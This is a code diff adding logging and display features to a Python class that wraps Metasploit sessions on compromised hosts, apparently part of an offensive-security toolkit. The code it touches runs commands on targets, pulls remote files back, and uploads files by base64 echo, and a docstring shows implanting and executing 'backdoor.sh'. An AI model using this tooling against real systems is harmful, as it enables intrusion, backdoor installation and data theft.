@@ -18,9 +18,14 @@ from __future__ import annotations
 import os
 from typing import TYPE_CHECKING, Optional
 
+from assassinate.console import print_kill
+from assassinate.log_config import get_logger
+
 if TYPE_CHECKING:
     import msf
     from assassinate.target import Target
+
+logger = get_logger("kill")
 
 
 class Kill:
@@ -70,6 +75,9 @@ class Kill:
         self.target = target
         self._via_weapon = via_weapon
         self._via_payload = via_payload
+        logger.success(
+            f"Kill confirmed: session {session.sid} @ {session.host}:{session.port} via {via_weapon or 'unknown'}"
+        )
 
     # =========================================================================
     # Identity
@@ -90,7 +98,8 @@ class Kill:
         """Whether the session is still alive."""
         try:
             return self._session.alive
-        except Exception:
+        except Exception as e:
+            logger.debug(f"Session alive check failed: {e}")
             return False
 
     @property
@@ -157,7 +166,14 @@ class Kill:
             >>> for line in passwd.splitlines():
             ...     print(line)
         """
-        return self._session.run_cmd(cmd, timeout)
+        logger.debug(f"Interrogating kill {self.id}: {cmd[:50] + '...' if len(cmd) > 50 else cmd}")
+        try:
+            result = self._session.run_cmd(cmd, timeout)
+            logger.debug(f"Interrogation returned {len(result)} chars")
+            return result
+        except Exception as e:
+            logger.error(f"Interrogation failed on kill {self.id}: {e}")
+            raise
 
     def read(self, length: Optional[int] = None) -> str:
         """Read available data from the session buffer.
@@ -209,21 +225,30 @@ class Kill:
         if local_path is None:
             local_path = os.path.basename(remote_path)
 
+        logger.info(f"Extracting {remote_path} from kill {self.id} to {local_path}")
+
         # Ensure local directory exists
         local_dir = os.path.dirname(local_path)
         if local_dir:
             os.makedirs(local_dir, exist_ok=True)
 
-        if self.is_meterpreter:
-            # Use meterpreter download
-            self._session._rust.fs_download(remote_path, local_path)
-        else:
-            # For shell sessions, use cat and write locally
-            content = self.interrogate(f"cat {remote_path}")
-            with open(local_path, "w") as f:
-                f.write(content)
+        try:
+            if self.is_meterpreter:
+                # Use meterpreter download
+                logger.debug("Using meterpreter download")
+                self._session._rust.fs_download(remote_path, local_path)
+            else:
+                # For shell sessions, use cat and write locally
+                logger.debug("Using shell cat method")
+                content = self.interrogate(f"cat {remote_path}")
+                with open(local_path, "w") as f:
+                    f.write(content)
 
-        return local_path
+            logger.success(f"Extraction complete: {local_path}")
+            return local_path
+        except Exception as e:
+            logger.error(f"Extraction failed: {e}")
+            raise
 
     def implant(self, local_path: str, remote_path: str) -> bool:
         """Upload a file to the target.
@@ -239,19 +264,28 @@ class Kill:
             >>> kill.implant("backdoor.sh", "/tmp/backdoor.sh")
             >>> kill.interrogate("chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh")
         """
-        if self.is_meterpreter:
-            # Use meterpreter upload
-            self._session._rust.fs_upload(local_path, remote_path)
-            return True
-        else:
-            # For shell sessions, base64 encode and decode on target
-            import base64
-            with open(local_path, "rb") as f:
-                content = base64.b64encode(f.read()).decode()
+        logger.info(f"Implanting {local_path} to kill {self.id} as {remote_path}")
 
-            # Upload using echo and base64 decode
-            self.interrogate(f"echo '{content}' | base64 -d > {remote_path}")
+        try:
+            if self.is_meterpreter:
+                # Use meterpreter upload
+                logger.debug("Using meterpreter upload")
+                self._session._rust.fs_upload(local_path, remote_path)
+            else:
+                # For shell sessions, base64 encode and decode on target
+                logger.debug("Using shell base64 method")
+                import base64
+                with open(local_path, "rb") as f:
+                    content = base64.b64encode(f.read()).decode()
+
+                # Upload using echo and base64 decode
+                self.interrogate(f"echo '{content}' | base64 -d > {remote_path}")
+
+            logger.success(f"Implant complete: {remote_path}")
             return True
+        except Exception as e:
+            logger.error(f"Implant failed: {e}")
+            raise
 
     # =========================================================================
     # Session Control
@@ -270,10 +304,12 @@ class Kill:
             ... finally:
             ...     kill.silence()
         """
+        logger.info(f"Silencing kill {self.id} @ {self.host}")
         try:
             self._session.kill()
-        except Exception:
-            pass
+            logger.info(f"Kill {self.id} silenced")
+        except Exception as e:
+            logger.warning(f"Failed to silence kill {self.id}: {e}")
 
     # =========================================================================
     # Advanced / Future Features
@@ -345,31 +381,108 @@ class Kill:
     # Display
     # =========================================================================
 
-    def summary(self) -> str:
-        """Get a summary of this kill.
+    def summary(self, full: bool = False) -> str:
+        """Get a detailed multi-line summary of this kill.
+
+        Args:
+            full: If True, show all vulnerabilities without truncation.
 
         Returns:
-            Multi-line string with kill details
+            Formatted string with full kill details
+
+        Example:
+            >>> print(kill.summary())
+            >>> kill.p(full=True)  # Show all vulns
         """
+        status = "✓ CONFIRMED" if self.confirmed else "✗ LOST"
         lines = [
-            f"Kill #{self.id}: {self.type}",
-            f"  Host: {self.host}:{self.port}",
-            f"  Status: {'CONFIRMED' if self.confirmed else 'LOST'}",
+            f"{'═' * 60}",
+            f"  Kill #{self.id} - {self.type.upper()}",
+            f"{'═' * 60}",
+            f"",
+            f"  Status: {status}",
+            f"  Target: {self.host}:{self.port}",
         ]
 
         if self.via_exploit:
-            lines.append(f"  Via: {self.via_exploit}")
+            lines.append(f"")
+            lines.append(f"  Attack Vector:")
+            lines.append(f"    Exploit: {self.via_exploit}")
         if self.via_payload:
-            lines.append(f"  Payload: {self.via_payload}")
+            lines.append(f"    Payload: {self.via_payload}")
 
-        if self.target:
-            lines.append(f"  Target: {self.target}")
+        if self.target and self.target.vulns:
+            lines.append(f"")
+            lines.append(f"  Known Vulnerabilities:")
+            vuln_limit = None if full else 5
+            for vuln in self.target.vulns[:vuln_limit]:
+                lines.append(f"    • {vuln}")
+            if not full and len(self.target.vulns) > 5:
+                lines.append(f"    ... and {len(self.target.vulns) - 5} more")
 
+        # Add session info if meterpreter
+        if self.is_meterpreter and self.confirmed:
+            lines.append(f"")
+            lines.append(f"  Meterpreter Info:")
+            try:
+                uid = self._session._rust.sys_getuid()
+                lines.append(f"    User: {uid}")
+            except Exception:
+                pass
+            try:
+                sysinfo = self._session._rust.sys_sysinfo()
+                if sysinfo.get("Computer"):
+                    lines.append(f"    Computer: {sysinfo.get('Computer')}")
+                if sysinfo.get("OS"):
+                    lines.append(f"    OS: {sysinfo.get('OS')}")
+            except Exception:
+                pass
+
+        lines.append(f"{'─' * 60}")
         return "\n".join(lines)
+
+    def p(self, full: bool = False) -> None:
+        """Print rich formatted summary.
+
+        Args:
+            full: If True, show all vulnerabilities without truncation.
+        """
+        # Gather meterpreter info if available
+        meterpreter_info = None
+        if self.is_meterpreter and self.confirmed:
+            meterpreter_info = {}
+            try:
+                meterpreter_info["user"] = self._session._rust.sys_getuid()
+            except Exception:
+                pass
+            try:
+                sysinfo = self._session._rust.sys_sysinfo()
+                meterpreter_info["computer"] = sysinfo.get("Computer")
+                meterpreter_info["os"] = sysinfo.get("OS")
+            except Exception:
+                pass
+
+        print_kill(
+            kill_id=self.id,
+            kill_type=self.type,
+            host=self.host,
+            port=self.port,
+            confirmed=self.confirmed,
+            via_exploit=self.via_exploit,
+            via_payload=self.via_payload,
+            vulns=self.target.vulns if self.target else None,
+            meterpreter_info=meterpreter_info if meterpreter_info else None,
+            full=full,
+        )
 
     def __repr__(self) -> str:
         status = "confirmed" if self.confirmed else "lost"
-        return f"<Kill #{self.id}: {self.type} @ {self.host}:{self.port} [{status}]>"
+        parts = [f"<Kill #{self.id}: {self.type} @ {self.host}:{self.port}"]
+        if self.via_exploit:
+            exploit_name = self.via_exploit.split('/')[-1] if '/' in self.via_exploit else self.via_exploit
+            parts.append(f"via={exploit_name}")
+        parts.append(f"[{status}]")
+        return " ".join(parts) + ">"
 
     def __str__(self) -> str:
         return f"Kill #{self.id} ({self.type} @ {self.host})"
